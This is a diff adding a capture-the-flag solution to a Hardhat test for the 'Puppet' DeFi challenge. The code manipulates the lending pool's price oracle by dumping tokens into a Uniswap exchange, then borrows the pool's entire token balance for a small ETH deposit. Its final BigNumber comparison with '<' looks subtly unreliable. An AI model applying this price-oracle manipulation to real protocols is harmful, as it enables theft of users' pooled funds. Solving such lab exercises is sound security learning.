@@ -103,6 +103,33 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // // amounts of Eth for ERC20
+        const amountEth = ethers.utils.parseEther('9.9');
+        // const inputReserve = await this.token.balanceOf(this.uniswapExchange.address);
+        // const outputReserve = await ethers.provider.getBalance(this.uniswapExchange.address);
+
+        // // calculate amount output
+        // const numerator = amountEth.mul(outputReserve).mul(ethers.BigNumber.from('997'));
+        // const denominator = (inputReserve.mul(ethers.BigNumber.from('1000'))).add(amountEth.mul(ethers.BigNumber.from('997')));
+
+        // const outputAmount = numerator.div(denominator);
+
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        const latestBlockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
+        const tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(
+            amountEth, 
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            latestBlockTimestamp + 1000
+        );
+
+        await tx.wait();
+
+        const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+
+        if(depositRequired < await ethers.provider.getBalance(attacker.address)) {
+            await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: depositRequired});
+        }
     });
 
     after(async function () {
